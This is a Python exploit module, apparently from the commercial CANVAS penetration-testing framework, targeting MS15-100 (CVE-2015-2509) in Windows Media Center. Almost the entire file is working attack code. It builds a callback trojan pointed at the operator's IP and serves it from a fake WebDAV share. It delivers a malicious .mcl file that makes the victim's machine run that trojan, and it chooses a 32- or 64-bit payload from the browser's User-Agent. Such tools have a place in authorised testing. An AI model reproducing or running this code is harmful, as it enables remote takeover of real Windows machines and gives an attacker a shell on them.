#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import ntpath
import logging

if "." not in sys.path:
    sys.path.append(".")

from random import randint
from random import choice
from string import ascii_uppercase
from string import ascii_lowercase
from string import digits
from struct import pack

from exploitutils import *
from tcpexploit import *
from httpclientside import *
from libs.spkproxy import header, body
from urlparse import urlparse
from libs.canvasos import canvasos

from MOSDEF.pelib import PElib
import canvasengine


NAME                            = "ms15_100"
DESCRIPTION                     = "MS15-100 - Windows Media Center Link RCE"

DOCUMENTATION                   = {}
DOCUMENTATION["VENDOR"]         = "Microsoft"
DOCUMENTATION['Date public']    = '08/09/2015'
DOCUMENTATION['CVE Name']       = 'CVE-2015-2509'
DOCUMENTATION['CVE Url']        = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2509'
DOCUMENTATION['CVSS']           = 9.3
DOCUMENTATION['References']     = 'https://technet.microsoft.com/library/security/ms15-100'

VERSION                         = '1.0'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Clientside'
PROPERTY['ARCH']                = [['Windows']]
PROPERTY['VERSION']             = ['7 SP1']

DOCUMENTATION["NOTES"]          = """
Tested on:
    Windows 7 SP1(32 bits)
    Windows 7 SP1(64 bits)

Use port 80 as the server port (Windows requirement related to WebDAV). Also, under
the Response tab of ClientD main window, the option "Respond directly with exploit"
must be selected.

NOTE: Our payload is a MOSDEF trojan. A popup will appear telling the binary
is not signed. If you don't want the popup to appear use a signed payload.
"""

CHANGELOG = """
"""

targets = {
    0 : ["N/A", None, 0],
    1 : ["Windows", "en-us", 0],
}

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.setInfo(DESCRIPTION)

        self.version = 0
        self.name = NAME

        self.is_running = False

        # Pick a random names
        self.share_name = ''.join(choice(ascii_lowercase + digits) for x in xrange(6))
        self.trojan_name = ''.join(choice(ascii_lowercase + digits) for x in xrange(6)) + ".exe"
        self.mcl_name = ''.join(choice(ascii_lowercase + digits) for x in xrange(6)) + ".mcl"

        self.x64 = False
        self.handles_options = True

        return

    def run(self):
        if not self.registerWebDavDirectory(self.share_name):
            logging.info("Bailing")
            return False

        self.is_running = True

        return True

    def create_trojan(self):
        t_os = canvasos('WINDOWS')
        if self.x64:
            t_os.arch = 'X64'
        else:
            t_os.arch   = 'X86'

        trojan = self.buildmosdeftrojan(self.callback.ip, self.callback.port, t_os, universal=True, win8_compatible=True)

        if trojan != True:
            logging.error('Building mosdef trojan failed')
            return 0

        # Write the trojan to the fs
        fd = open(self.trojan_name, "wb")
        fd.write(self.mosdeftrojan)
        fd.close()

        return self.mosdeftrojan

    def create_mcl_file(self):
        self.unc_path = "\\\\" + str(self.callback.ip) + "\\"

        if self.share_name != "":
            self.unc_path += self.share_name + "\\"

        path = ntpath.join(self.unc_path, self.trojan_name)
        return '<application run="%s">' % path

    def makesploit(self, clientheader, clientbody):
        if not self.is_running:
            self.run()
        useragent = clientheader.getStrValue(['User-Agent'])
        if 'win64' in useragent.lower() or 'WOW64' in useragent.lower():
            self.x64 = True
        else:
            self.x64 = False
        if clientheader.verb == "OPTIONS":
            h, b = self.do_options(clientheader, clientbody)
        elif clientheader.verb == "PROPFIND":
            h, b = self.do_propfind(clientheader, clientbody)
        elif clientheader.verb in ["GET","POST"]:
            h, b = self.do_get(clientheader, clientbody)
        else:
            logging.error("Invalid request method (%s)" % clientheader.verb)
            h = header("SERVER")
            b = body()
            h.status = "404"
            h.msg = "Not Found"
            h.addHeader("Content-Type", "text/html")
            b.setBody("")

        return h, b

    def do_get(self, clientheader, clientbody):
        logging.info("Serving GET request (%s)" %clientheader.URL)

        h = header("SERVER")
        b = body()

        if clientheader.URL.endswith(".exe"):
            logging.info("Serving Trojan (%s)" % clientheader.URL)
            content = self.create_trojan()
            b.setBody(content)
            h.addHeader("Content-Type","application/octet-stream")
        else:
            logging.info("Serving MCL File (%s)" % clientheader.URL)
            content = self.create_mcl_file()
            b.setBody(content)
            h.addHeader("Content-Type","application/octet-stream")
            h.addHeader("Content-Disposition",'attachment; filename="%s"' % self.mcl_name)

        return h, b

    def do_options(self, clientheader, clientbody):
        logging.info("Serving OPTIONS request (%s)" % clientheader.URL)

        h = header("SERVER")
        b = body()

        h.addHeader("Content-Type", "text/xml")
        h.addHeader("DAV", "1, 2")
        h.addHeader("Public", "OPTIONS, GET, PROPFIND")
        h.addHeader("Allow", "OPTIONS, GET, PROPFIND")
        h.addHeader("Refresh", "")

        h.status = "207"
        h.msg = "Multi-Status"

        b.setBody("")

        return h, b

    def do_propfind(self, clientheader, clientbody):
        logging.info("Serving PROPFIND request (%s)" % clientheader.URL)

        h = header("SERVER")
        b = body()

        if clientheader.URL.endswith(".exe"):
            logging.info("Sending multi-status for %s" % clientheader.URL)
            requested_file = urlparse(clientheader.URL).path.split("/")[-1]
            logging.info("Requested file is %s" % requested_file)

            content_body = """<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>%u</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>""" % (clientheader.URL, requested_file, randint(0x1F400, 0x11F400), randint(0x0, 0x100000000))

            # The default 207 (Multi-Status) response body is a text/xml or application/xml
            # HTTP entity that contains a single XML element called multistatus. Multistatus
            # contains a set of XML elements called response that include 200, 300, 400, and 500
            # status codes generated during the method invocation
            h.status = "207"
            h.msg = "Multi-Status"
            h.addHeader("Content-Type", "text/xml")
            b.setBody(content_body)

            return h, b

        if not clientheader.URL.endswith("/"):
            if clientheader.URL.count(".") != 0:
                logging.info("Sending 404 for %s" % clientheader.URL)

                h.status = "404"
                h.msg = "Not Found"
                h.addHeader("Content-Type","text/html")
                b.setBody("")

                return h, b

        logging.info("Trying to server content list %s" %(clientheader.URL))

        content_body = """<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
""" % (clientheader.URL, randint(0x0, 0x100000000))

        files = """
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s/%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>%u</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>

""" %(clientheader.URL, self.trojan_name, randint(0x1F400,0x11F400), randint(0x0, 0x100000000))

        if int(clientheader.getHeaderValue("Depth")) > 0:
            logging.info("Depth > 0")
            content_body += files

        content_body += "</D:multistatus>"

        h.status = "207"
        h.msg = "Multi-Status"
        h.addHeader("Content-Type",'text/xml; charset="utf8"')
        b.setBody(content_body)

        return h, b

    def is_vulnerable(self, info_dict):
        logging.info("is_vulnerable()")

        server_port = self.getServerPort()
        if server_port != 80:
            logging.error("ClientD needs to be running on port 80 (currently on %s)" % server_port)
            return 0

        if not self.is_windows(info_dict):
            return 0

        return 1


# For running the exploit on the command line
if __name__ == "__main__":
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
